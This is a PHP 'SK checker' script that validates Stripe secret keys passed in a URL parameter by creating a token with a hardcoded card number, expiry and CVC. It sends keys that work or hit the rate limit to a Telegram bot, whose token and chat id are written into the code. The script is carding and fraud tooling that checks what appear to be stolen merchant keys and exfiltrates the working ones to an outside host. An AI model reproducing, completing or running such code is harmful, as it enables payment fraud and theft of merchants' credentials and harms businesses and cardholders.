<?php




error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };

$lista = $_GET['lista'];
$sk = "$lista";


//================= [ CURL REQUESTS ] =================//

#-------------------[1st REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5278540001668044&card[exp_month]=10&card[exp_year]=2024&card[cvc]=242");
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);

if(strpos($result, '"cvc_check": "unchecked"' )) {
    echo '#LIVE</span>  </span>:  '.$lista.'</span>  <br>➤ Response:    @ParvezOnFire2 <br>';
file_get_contents("https://api.telegram.org/bot5408259686:AAFmTfUwyhBxXlRPx0sdRLaOYAutky3T3B4/sendMessage?chat_id=-1001680577701&text=✅<code>$sk</code> %0A @ParvezOnFire2&parse_mode=HTML");
}



elseif(strpos($result,'"rate_limit"')){
    echo '#Rate_limit</span>  </span>  '.$lista.'</span>  <br>Result:Rate Limit</span><br>';
   
file_get_contents("https://api.telegram.org/bot5408259686:AAFmTfUwyhBxXlRPx0sdRLaOYAutky3T3B4/sendMessage?chat_id=-1001680577701&text=Rate limit <code>$sk</code>%0A&parse_mode=HTML");

   } 

elseif ((strpos($result, 'api_key_expired'))){
echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: API EXPIRED</span><br>';
}

elseif ((strpos($result, 'testmode_charges_only'))){
echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: TESTMODE CHARGE</span><br>';
}

elseif ((strpos($result, 'Invalid API Key provided'))){
echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVALID</span><br>';
}

else {
 echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: Unkown Error</span><br>';
}



?>